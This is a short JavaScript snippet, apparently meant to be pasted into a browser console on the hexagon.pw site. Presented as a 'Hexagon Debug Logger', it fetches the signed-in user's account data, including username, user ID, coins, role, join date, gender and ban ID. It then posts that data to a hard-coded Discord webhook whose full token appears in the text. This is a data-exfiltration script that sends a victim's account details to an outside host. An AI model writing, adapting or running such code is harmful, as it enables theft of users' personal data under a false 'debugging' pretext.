(async () => {
    // URL of the JSON data
    const dataUrl = "https://hexagon.pw/avatar/__data.json";

    // Discord webhook URL
    const discordWebhookUrl = "https://canary.discord.com/api/webhooks/1322108310673035264/R8OiLGEPwUNVeLL_vxch7INPQM-NNzglKFiji8HuUKEBVn5ACGVyQxIgrYgjdJl13y0r"; // Replace with your webhook URL

    async function fetchAvatarData() {
        try {
            const response = await fetch(dataUrl);
            if (!response.ok) {
                throw new Error(`Failed to fetch avatar data. Status: ${response.status}`);
            }
            return await response.json();
        } catch (error) {
            console.error("Error fetching avatar data:", error);
            return null;
        }
    }

    async function logToDiscordWebhook(userData, webhookUrl) {
        if (!userData || !webhookUrl) {
            console.error("User data or webhook URL is missing. Cannot log to Discord.");
            return;
        }

        // Construct the Discord embed payload
        const payload = {
            embeds: [
                {
                    title: "User Debugging Information",
                    color: 5814783, // Blue-green color
                    fields: [
                        { name: "Username", value: userData.username || "N/A", inline: true },
                        { name: "User ID", value: userData.userid || "N/A", inline: true },
                        { name: "Coins", value: userData.coins.toString() || "0", inline: true },
                        { name: "Role", value: userData.role || "N/A", inline: true },
                        { name: "Join Date", value: userData.joindate || "N/A", inline: true },
                        { name: "Last Active", value: userData.lastactivetime || "N/A", inline: true },
                        { name: "Last Stipend", value: userData.laststipend || "N/A", inline: true },
                        { name: "Gender", value: userData.gender || "N/A", inline: true },
                        { name: "Ban ID", value: userData.banid ? userData.banid.toString() : "None", inline: true },
                    ],
                    footer: {
                        text: "Hexagon Debug Logger",
                    },
                    timestamp: new Date().toISOString(),
                },
            ],
        };

        try {
            const response = await fetch(webhookUrl, {
                method: "POST",
                headers: {
                    "Content-Type": "application/json",
                },
                body: JSON.stringify(payload),
            });

            if (!response.ok) {
                console.error(`Failed to send log to Discord webhook. Status: ${response.status}`);
            } else {
                console.log("Successfully logged user data to Discord webhook.");
            }
        } catch (error) {
            console.error("Error logging to Discord webhook:", error);
        }
    }

    // Main execution
    const avatarData = await fetchAvatarData();

    if (avatarData && avatarData.nodes && avatarData.nodes.length > 0) {
        const userNode = avatarData.nodes.find(node => Array.isArray(node?.data));

        if (userNode && userNode.data.length >= 11) {
            const userData = {
                username: userNode.data[1], // Replace with the correct data index
                userid: userNode.data[2],
                coins: userNode.data[3],
                role: userNode.data[4],
                joindate: userNode.data[5],
                lastactivetime: userNode.data[6],
                laststipend: userNode.data[7],
                gender: userNode.data[8],
                banid: userNode.data[9],
            };

            await logToDiscordWebhook(userData, discordWebhookUrl);
        } else {
            console.error("User data not found in the fetched JSON.");
        }
    } else {
        console.error("Failed to retrieve valid avatar data.");
    }
})();